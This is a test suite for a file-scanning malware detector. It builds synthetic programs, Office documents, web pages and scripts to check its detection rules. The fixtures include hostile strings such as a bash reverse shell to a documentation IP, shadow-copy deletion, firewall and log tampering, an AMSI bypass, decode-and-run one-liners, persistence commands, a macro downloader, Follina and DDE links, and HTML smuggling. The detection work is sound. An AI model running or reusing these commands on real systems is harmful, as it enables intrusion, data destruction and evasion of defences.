import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { deflateRawSync } from "node:zlib";

import { describe, expect, it } from "vitest";

import {
  combineIndicators,
  decompressVba,
  entropy,
  htmlFindings,
  macroFindings,
  oneNoteFindings,
  ooxmlPartFindings,
  parsePe,
  peFindings,
  rtfFindings,
  scriptRuleFindings,
  shortcutFindings,
  stringFindings,
} from "../src/engine/analysis";
import { scanFile } from "../src/engine/scanner";
import { SignatureStore } from "../src/engine/signatures";

const rules = (findings: { rule: string }[]) => findings.map((f) => f.rule);

// --- A minimal, well-formed PE32 builder -------------------------------------------------

interface SectionSpec {
  name: string;
  data: Buffer;
  flags?: number; // characteristics
}

const CODE = 0x60000020; // code, execute, read
const DATA_RW = 0xc0000040; // initialised data, read, write

/** Builds a PE32 file with the given sections and imports (placed in an extra ".idata" section). */
function buildPe(sections: SectionSpec[], imports: Record<string, string[]> = {}, options: { timestamp?: number } = {}): Buffer {
  const fileAlign = 0x200;
  const sectAlign = 0x1000;
  const align = (n: number, a: number) => Math.ceil(n / a) * a;
  const all = [...sections];
  const idataIndex = Object.keys(imports).length ? all.length : -1;
  if (idataIndex >= 0) all.push({ name: ".idata", data: Buffer.alloc(0), flags: DATA_RW });

  const headerSize = align(0x80 + 4 + 20 + 224 + 40 * all.length, fileAlign);
  // Virtual addresses first, so the import section can reference itself.
  const vas: number[] = [];
  let va = sectAlign;
  for (const s of all) {
    vas.push(va);
    va += align(Math.max(s.data.length, 0x1000), sectAlign);
  }
  if (idataIndex >= 0) {
    const base = vas[idataIndex]!;
    const dlls = Object.entries(imports);
    const descSize = (dlls.length + 1) * 20;
    const parts: Buffer[] = [];
    let cursor = descSize;
    const strings: { at: number; bytes: Buffer }[] = [];
    const thunks: number[][] = [];
    const nameRvas: number[] = [];
    // Layout: descriptors | thunk arrays | names
    const thunkStart = cursor;
    let thunkCursor = thunkStart;
    const thunkOffsets: number[] = [];
    for (const [, fns] of dlls) {
      thunkOffsets.push(thunkCursor);
      thunkCursor += (fns.length + 1) * 4;
    }
    cursor = thunkCursor;
    for (const [dll, fns] of dlls) {
      nameRvas.push(base + cursor);
      const dllBytes = Buffer.from(`${dll}\0`, "latin1");
      strings.push({ at: cursor, bytes: dllBytes });
      cursor += dllBytes.length;
      const list: number[] = [];
      for (const fn of fns) {
        list.push(base + cursor);
        const entry = Buffer.concat([Buffer.alloc(2), Buffer.from(`${fn}\0`, "latin1")]);
        strings.push({ at: cursor, bytes: entry });
        cursor += entry.length;
      }
      thunks.push(list);
    }
    const idata = Buffer.alloc(cursor);
    dlls.forEach((_, i) => {
      idata.writeUInt32LE(base + thunkOffsets[i]!, i * 20); // OriginalFirstThunk
      idata.writeUInt32LE(nameRvas[i]!, i * 20 + 12);
      idata.writeUInt32LE(base + thunkOffsets[i]!, i * 20 + 16);
      thunks[i]!.forEach((rva, j) => idata.writeUInt32LE(rva, thunkOffsets[i]! + j * 4));
    });
    for (const { at, bytes } of strings) bytes.copy(idata, at);
    parts.push(idata);
    all[idataIndex] = { ...all[idataIndex]!, data: idata };
  }

  const raws: number[] = [];
  let raw = headerSize;
  for (const s of all) {
    raws.push(raw);
    raw += align(s.data.length, fileAlign);
  }
  const out = Buffer.alloc(raw);
  out.write("MZ", 0, "latin1");
  out.writeUInt32LE(0x80, 0x3c);
  out.writeUInt32BE(0x50450000, 0x80);
  const coff = 0x84;
  out.writeUInt16LE(0x14c, coff);
  out.writeUInt16LE(all.length, coff + 2);
  out.writeUInt32LE(options.timestamp ?? 1_600_000_000, coff + 4);
  out.writeUInt16LE(224, coff + 16);
  out.writeUInt16LE(0x0102, coff + 18);
  const opt = coff + 20;
  out.writeUInt16LE(0x10b, opt);
  out.writeUInt32LE(16, opt + 92);
  if (idataIndex >= 0) {
    out.writeUInt32LE(vas[idataIndex]!, opt + 96 + 8);
    out.writeUInt32LE(all[idataIndex]!.data.length, opt + 96 + 12);
  }
  all.forEach((s, i) => {
    const at = opt + 224 + i * 40;
    out.write(s.name.slice(0, 8), at, "latin1");
    out.writeUInt32LE(s.data.length, at + 8);
    out.writeUInt32LE(vas[i]!, at + 12);
    out.writeUInt32LE(align(s.data.length, fileAlign), at + 16);
    out.writeUInt32LE(raws[i]!, at + 20);
    out.writeUInt32LE((s.flags ?? CODE) >>> 0, at + 36);
    s.data.copy(out, raws[i]!);
  });
  return out;
}

const plainCode = Buffer.alloc(0x2000, 0x90); // NOPs: low entropy
const randomish = (size: number) => {
  const b = Buffer.alloc(size);
  let x = 2463534242;
  for (let i = 0; i < size; i++) {
    x ^= x << 13; x >>>= 0; x ^= x >>> 17; x ^= x << 5; x >>>= 0;
    b[i] = x & 0xff;
  }
  return b;
};

describe("entropy", () => {
  it("is 0 for uniform data and close to 8 for random data", () => {
    expect(entropy(Buffer.alloc(1000, 7))).toBe(0);
    expect(entropy(randomish(64 * 1024))).toBeGreaterThan(7.9);
  });
});

describe("Windows programs (PE)", () => {
  it("parses sections and imports", () => {
    const pe = parsePe(buildPe([{ name: ".text", data: plainCode }], { "KERNEL32.dll": ["CreateFileW", "ReadFile"], "user32.dll": ["MessageBoxW"] }))!;
    expect(pe).not.toBeNull();
    expect(pe.sections.map((s) => s.name)).toEqual([".text", ".idata"]);
    expect(pe.importedDlls).toEqual(["kernel32.dll", "user32.dll"]);
    expect(pe.imports).toEqual(["kernel32.dll!CreateFileW", "kernel32.dll!ReadFile", "user32.dll!MessageBoxW"]);
  });

  it("reports nothing for an ordinary program", () => {
    expect(peFindings(buildPe([{ name: ".text", data: plainCode }], { "kernel32.dll": ["CreateFileW", "ReadFile", "WriteFile", "CloseHandle", "ExitProcess"] }))).toEqual([]);
  });

  it("spots packers, encrypted code, self-modifying sections and hidden imports", () => {
    const upx = buildPe([{ name: "UPX0", data: plainCode, flags: CODE | 0x80000000 }, { name: "UPX1", data: randomish(0x4000) }], { "kernel32.dll": ["LoadLibraryA", "GetProcAddress"] });
    expect(rules(peFindings(upx))).toEqual(expect.arrayContaining(["pe_packed", "pe_wx_section", "pe_few_imports"]));
    const dense = buildPe([{ name: ".text", data: randomish(0x4000) }]);
    expect(rules(peFindings(dense))).toContain("pe_high_entropy");
  });

  it("groups imports into capabilities", () => {
    const injector = buildPe([{ name: ".text", data: plainCode }], {
      "kernel32.dll": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
    });
    expect(rules(peFindings(injector))).toEqual(["pe_injection"]);
    const hollower = buildPe([{ name: ".text", data: plainCode }], {
      "kernel32.dll": ["CreateProcessW", "WriteProcessMemory", "SetThreadContext", "ResumeThread"],
      "ntdll.dll": ["NtUnmapViewOfSection"],
    });
    expect(rules(peFindings(hollower))).toContain("pe_hollowing");
    const keylogger = buildPe([{ name: ".text", data: plainCode }], { "user32.dll": ["SetWindowsHookExW", "GetAsyncKeyState", "CallNextHookEx"] });
    expect(rules(peFindings(keylogger))).toEqual(["pe_keylogger"]);
  });

  it("notices an edited build date", () => {
    const future = buildPe([{ name: ".text", data: plainCode }], {}, { timestamp: Math.floor(Date.now() / 1000) + 400 * 86_400 });
    expect(rules(peFindings(future))).toContain("pe_future_timestamp");
  });

  it("ignores truncated or malformed headers", () => {
    const pe = buildPe([{ name: ".text", data: plainCode }], { "kernel32.dll": ["ReadFile"] });
    expect(parsePe(pe.subarray(0, 0x90))).toBeNull();
    const broken = Buffer.from(pe);
    broken.writeUInt32LE(0xfffffff0, 0x3c);
    expect(parsePe(broken)).toBeNull();
    expect(peFindings(Buffer.from("MZ not really a program"))).toEqual([]);
  });
});

describe("behaviour strings", () => {
  it("finds ransom notes, shadow-copy deletion, miners, stealers, reverse shells and security tampering", () => {
    const cases: [string, string][] = [
      ["ransom_note", "All your files have been encrypted! To get them back send 0.1 Bitcoin and contact us via Tor Browser at abc.onion"],
      ["shadow_copy_delete", 'cmd /c vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no'],
      ["crypto_miner", "-o stratum+tcp://pool.example:3333 -u wallet"],
      ["credential_theft", "\\Google\\Chrome\\User Data\\Default\\Login Data ... \\Mozilla\\Firefox\\Profiles logins.json ... wallet.dat"],
      ["reverse_shell", "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"],
      ["security_disable", "netsh advfirewall set allprofiles state off"],
      ["log_clearing", "wevtutil cl Security"],
      ["sandbox_evasion", "if exist VBoxService.exe ... SbieDll.dll"],
    ];
    for (const [rule, text] of cases) expect(rules(stringFindings(Buffer.from(text))), rule).toContain(rule);
  });

  it("reads UTF-16 strings inside programs", () => {
    const utf16 = Buffer.concat([Buffer.from("MZ"), Buffer.from("vssadmin delete shadows /all", "utf16le")]);
    expect(rules(stringFindings(utf16))).toContain("shadow_copy_delete");
  });

  it("does not flag ordinary text about the same topics", () => {
    const article = "Ransomware encrypts files. Keep backups. Chrome stores passwords in Login Data. Bitcoin is a currency. Use a firewall.";
    expect(stringFindings(Buffer.from(article))).toEqual([]);
  });
});

describe("scripts", () => {
  it("finds AMSI bypasses, decode-and-run, scrambling, hidden PowerShell and persistence", () => {
    const cases: [string, string][] = [
      ["amsi_bypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"],
      ["base64_execute", "$c=[System.Convert]::FromBase64String($p); iex ([Text.Encoding]::UTF8.GetString($c))"],
      ["base64_execute", "eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))"],
      ["base64_execute", "echo ZWNobyBoZWxsbyB3b3JsZCBmcm9tIGEgaGlkZGVuIHNjcmlwdCB0aGF0IGRvZXMgdGhpbmdz | base64 -d | sh"],
      ["char_obfuscation", `$x = ${Array.from({ length: 25 }, (_, i) => `[char]${100 + i}`).join("+")}`],
      ["hidden_window", "powershell.exe -nop -w hidden -ep bypass -file run.ps1"],
      ["script_persistence", 'schtasks /create /tn "Updater" /tr "C:\\Users\\Public\\u.exe" /sc onlogon'],
      ["script_persistence", 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v u /d c:\\u.exe'],
      ["script_persistence", '(crontab -l; echo "@reboot /tmp/.x") | crontab -'],
    ];
    for (const [rule, text] of cases) expect(rules(scriptRuleFindings(Buffer.from(text))), `${rule}: ${text}`).toContain(rule);
  });

  it("leaves an ordinary build script alone", () => {
    expect(scriptRuleFindings(Buffer.from("#!/bin/sh\nset -e\nnpm ci\nnpm run build\ncp -r dist /srv/www\n"))).toEqual([]);
  });
});

// --- Office macros -------------------------------------------------------------------------

/** MS-OVBA "compression" using literal tokens only: valid input for any decompressor. */
function vbaCompress(text: string): Buffer {
  const data = Buffer.from(text, "latin1");
  const chunks: Buffer[] = [Buffer.from([0x01])];
  for (let start = 0; start < data.length; start += 4096) {
    const chunk = data.subarray(start, start + 4096);
    const body: number[] = [];
    for (let i = 0; i < chunk.length; i += 8) body.push(0x00, ...chunk.subarray(i, i + 8));
    const header = Buffer.alloc(2);
    header.writeUInt16LE(0x8000 | 0x3000 | (body.length + 2 - 3), 0);
    chunks.push(header, Buffer.from(body));
  }
  return Buffer.concat(chunks);
}

const OLE = Buffer.from("d0cf11e0a1b11ae1", "hex");

describe("Office macros", () => {
  it("decompresses MS-OVBA, including copy tokens", () => {
    const literal = decompressVba(vbaCompress("Attribute VB_Name = \"Module1\""), 0)!;
    expect(literal.toString("latin1")).toBe('Attribute VB_Name = "Module1"');
    // "abc" then a copy token (offset 3, length 6) -> "abcabcabc"
    const tokens = Buffer.from([0x08, 0x61, 0x62, 0x63, 0x03, 0x20]);
    const header = Buffer.alloc(2);
    header.writeUInt16LE(0x8000 | 0x3000 | (tokens.length + 2 - 3), 0);
    expect(decompressVba(Buffer.concat([Buffer.from([0x01]), header, tokens]), 0)!.toString("latin1")).toBe("abcabcabc");
    expect(decompressVba(Buffer.from([0x00, 0x00]), 0)).toBeNull();
  });

  it("reads macro code inside a legacy Office file and flags auto-run downloaders", () => {
    const source = 'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n  Shell("powershell -c iwr http://198.51.100.7/a.exe -o a.exe")\r\nEnd Sub\r\n';
    const doc = Buffer.concat([OLE, Buffer.alloc(504), Buffer.from("_VBA_PROJECT", "utf16le"), Buffer.alloc(64), vbaCompress(source)]);
    expect(rules(macroFindings(doc))).toEqual(["office_macros", "macro_autorun_action"]);
  });

  it("separates harmless macros from ones that run programs", () => {
    const harmless = Buffer.concat([OLE, Buffer.from("_VBA_PROJECT", "utf16le"), vbaCompress('Attribute VB_Name = "M"\r\nSub Tidy()\r\n Selection.Font.Bold = True\r\nEnd Sub')]);
    expect(rules(macroFindings(harmless))).toEqual(["office_macros"]);
    const action = Buffer.concat([OLE, vbaCompress('Attribute VB_Name = "M"\r\nSub Go()\r\n CreateObject("WScript.Shell").Run "cmd /c calc"\r\nEnd Sub')]);
    expect(rules(macroFindings(action))).toContain("macro_action");
  });
});

describe("documents", () => {
  it("flags RTF files aimed at the Equation Editor", () => {
    const rtf = Buffer.from("{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000}}}");
    expect(rules(rtfFindings(rtf))).toEqual(["rtf_equation_exploit"]);
    expect(rtfFindings(Buffer.from("{\\rtf1 Hello}"))).toEqual([]);
  });

  it("flags remote templates, Follina links, DDE and Excel 4.0 macro sheets", () => {
    const template = '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://198.51.100.7/t.dotm" TargetMode="External"/></Relationships>';
    expect(rules(ooxmlPartFindings("word/_rels/settings.xml.rels", Buffer.from(template)))).toEqual(["ooxml_remote_template"]);
    const follina = '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://198.51.100.7/x.html!x-usc:http://198.51.100.7/x.html" TargetMode="External"/>';
    expect(rules(ooxmlPartFindings("word/_rels/document.xml.rels", Buffer.from(follina)))).toEqual(["ooxml_protocol_exploit"]);
    const hyperlink = '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/>';
    expect(ooxmlPartFindings("word/_rels/document.xml.rels", Buffer.from(hyperlink))).toEqual([]);
    const dde = '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r>';
    expect(rules(ooxmlPartFindings("word/document.xml", Buffer.from(dde)))).toEqual(["ooxml_dde"]);
    expect(rules(ooxmlPartFindings("xl/macrosheets/sheet1.xml", Buffer.from("<xm:macrosheet/>")))).toEqual(["excel4_macros"]);
  });
});

describe("web-style files", () => {
  it("spots HTML smuggling", () => {
    const blob = "A".repeat(25_000);
    const page = `<html><script>var d="${blob}";var b=new Blob([atob(d)]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download="invoice.iso";a.click();</script></html>`;
    expect(rules(htmlFindings("invoice.html", Buffer.from(page)))).toContain("html_smuggling");
  });

  it("spots phishing attachments, scripted SVGs and hidden redirects", () => {
    const form = '<html><form action="https://collect.example.net/p.php" method="post"><input name="email"><input type="password" name="p"></form></html>';
    expect(rules(htmlFindings("Secure_Message.htm", Buffer.from(form)))).toEqual(["html_phishing_form"]);
    expect(rules(htmlFindings("logo.svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>location="https://x.example"</script></svg>')))).toContain("svg_script");
    expect(rules(htmlFindings("a.html", Buffer.from("<html><script>window.location.href = atob('aHR0cHM6Ly94LmV4YW1wbGU=')</script></html>")))).toContain("html_hidden_redirect");
  });

  it("leaves an ordinary saved page and a plain SVG alone", () => {
    expect(htmlFindings("page.html", Buffer.from("<!doctype html><html><body><h1>Recipes</h1><form action='/search'><input name=q></form></body></html>"))).toEqual([]);
    expect(htmlFindings("icon.svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>'))).toEqual([]);
    expect(htmlFindings("notes.txt", Buffer.from("<input type=password> https://x"))).toEqual([]);
  });

  it("spots OneNote droppers and shortcuts to remote programs", () => {
    const one = Buffer.concat([Buffer.from("e4525c7b8cd8a74daeb15378d02996d3", "hex"), Buffer.from("....<HTA:APPLICATION id=x>...")]);
    expect(rules(oneNoteFindings("Invoice.one", one))).toEqual(["onenote_embedded"]);
    expect(oneNoteFindings("Notes.one", Buffer.from("plain notes"))).toEqual([]);
    expect(rules(shortcutFindings("Report.url", Buffer.from("[InternetShortcut]\r\nURL=file://198.51.100.7/share/report.exe\r\n")))).toEqual(["remote_shortcut"]);
    expect(shortcutFindings("News.url", Buffer.from("[InternetShortcut]\r\nURL=https://news.example.org/\r\n"))).toEqual([]);
  });
});

describe("combining weak signals", () => {
  const f = (rule: string) => ({ severity: "low" as const, rule, title: rule, detail: "" });
  it("needs at least two signals worth four points", () => {
    expect(combineIndicators([f("pe_packed")])).toEqual([]);
    expect(combineIndicators([f("pe_packed"), f("pe_wx_section")])).toEqual([]);
    expect(rules(combineIndicators([f("pe_packed"), f("pe_injection"), f("pe_wx_section")]))).toEqual(["combined_indicators"]);
    expect(combineIndicators([{ ...f("pe_packed"), member: "a.exe" }, { ...f("pe_injection"), member: "a.exe" }])).toEqual([]);
  });
});

// --- Through the whole scanner ----------------------------------------------------------

function zip(files: Record<string, string>): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const [name, text] of Object.entries(files)) {
    const data = Buffer.from(text);
    const packed = deflateRawSync(data);
    const nameBytes = Buffer.from(name);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(packed.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(8, 10);
    central.writeUInt32LE(packed.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt32LE(offset, 42);
    locals.push(local, nameBytes, packed);
    centrals.push(central, nameBytes);
    offset += 30 + nameBytes.length + packed.length;
  }
  const centralBuffer = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(centralBuffer.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, centralBuffer, end]);
}

describe("scanner integration", () => {
  it("reports the new findings with the right verdicts", async () => {
    const dir = await mkdtemp(join(tmpdir(), "qalaa-detect-"));
    const signatures = new SignatureStore(join(dir, "signatures.json"));
    await signatures.open();
    const write = async (name: string, data: Buffer | string) => {
      await writeFile(join(dir, name), data);
      return scanFile(join(dir, name), { signatures });
    };

    const docx = await write(
      "Contract.docx",
      zip({
        "[Content_Types].xml": "<Types/>",
        "word/document.xml": "<w:document/>",
        "word/_rels/settings.xml.rels":
          '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://198.51.100.7/t.dotm" TargetMode="External"/></Relationships>',
      }),
    );
    expect(docx.verdict).toBe("suspicious");
    expect(docx.findings.find((f) => f.rule === "ooxml_remote_template")?.member).toBe("word/_rels/settings.xml.rels");

    const packedInjector = await write(
      "setup.exe",
      buildPe([{ name: "UPX0", data: plainCode, flags: CODE | 0x80000000 }, { name: "UPX1", data: randomish(0x4000) }], {
        "kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "LoadLibraryA", "GetProcAddress"],
      }),
    );
    expect(rules(packedInjector.findings)).toEqual(expect.arrayContaining(["pe_packed", "pe_injection", "combined_indicators"]));
    expect(packedInjector.verdict).toBe("suspicious");

    const ordinary = await write("tool.exe", buildPe([{ name: ".text", data: plainCode }], { "kernel32.dll": ["CreateFileW", "ExitProcess"] }));
    expect(ordinary.verdict).toBe("no_known_threat");

    const script = await write("update.ps1", "powershell -nop -w hidden -ep bypass -c \"$b=[Convert]::FromBase64String('aGk='); iex $b\"");
    expect(script.verdict).toBe("suspicious");

    const article = await write("ransomware-guide.txt", "If your files have been encrypted, do not pay in Bitcoin. Restore from backups.");
    expect(article.verdict).toBe("no_known_threat");
  });
});
